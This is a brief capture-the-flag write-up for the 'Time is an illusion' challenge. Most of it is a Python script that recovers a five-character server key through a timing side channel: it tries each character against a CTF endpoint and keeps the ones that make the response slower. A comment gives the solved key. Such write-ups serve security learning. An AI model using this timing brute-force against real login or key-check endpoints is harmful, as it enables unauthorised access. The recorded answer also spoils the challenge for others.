Challenge Name:  Time is an illusion 


we need to leak the key from the server.

import requests
from time import time
from string import ascii_lowercase, ascii_uppercase, digits

dic = ascii_lowercase + ascii_uppercase + digits
flag = ['x']*5
'''
flag[0] = 'K'
flag[1] = 'u'
flag[2] = 'K'
flag[3] = 'a'
flag[4] = '9'
'''

for i in range(5):
    for x in dic:
        flag[i] = x #chr(j)
        t1 = time()
        conn = requests.get('https://time-is-an-illusion.vishwactf.com/handle.php?key='+''.join(flag))
        r1 = conn.text
        t2 = time()
        print(t2 - t1)
        #print(x)
        if t2 - t1 > 1*(i+1):
            pass1 = time()
            conn = requests.get('https://time-is-an-illusion.vishwactf.com/handle.php?key='+''.join(flag))
            r1 = conn.text
            pass2 = time()
            if pass2 - pass1 > 1*(i+1):
                print(''.join(flag))
                break
